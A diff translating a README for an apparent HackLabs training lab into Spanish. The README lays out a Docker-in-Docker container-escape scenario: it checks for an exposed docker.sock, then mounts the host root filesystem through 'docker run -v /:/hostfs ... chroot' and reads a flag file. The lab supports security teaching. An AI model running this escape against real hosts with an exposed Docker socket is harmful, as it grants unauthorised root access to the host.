@@ -1,20 +1,20 @@
-# Docker Escape Ad-Hoc Scenario
+# Escenario Ad-Hoc de Docker Escape
 
-This isolated lab uses Docker-in-Docker so exploitation commands work even when the main HackLabs container does not expose `/var/run/docker.sock`.
+Este laboratorio aislado usa Docker-in-Docker para que los comandos de explotación funcionen incluso cuando el contenedor principal de HackLabs no expone `/var/run/docker.sock`.
 
-## Start
+## Inicio
 
 ```bash
 docker compose -f docker-compose.docker-escape.yml up -d --build
 ```
 
-## Enter victim container
+## Entrar al contenedor víctima
 
 ```bash
 docker exec -it hacklabs-escape-victim sh
 ```
 
-## Validate prerequisites (inside victim)
+## Validar prerrequisitos (dentro de la víctima)
 
 ```bash
 ls /.dockerenv
@@ -22,16 +22,16 @@ ls -la /var/run/docker.sock
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
 ```
 
-Expected `_ping` response: `OK`
+Respuesta esperada de `_ping`: `OK`
 
-## Socket escape commands (inside victim)
+## Comandos de escape por socket (dentro de la víctima)
 
 ```bash
 docker run -v /:/hostfs --rm -it alpine chroot /hostfs sh
 cat /root/root.txt
 ```
 
-## Stop and clean
+## Detener y limpiar
 
 ```bash
 docker compose -f docker-compose.docker-escape.yml down -v
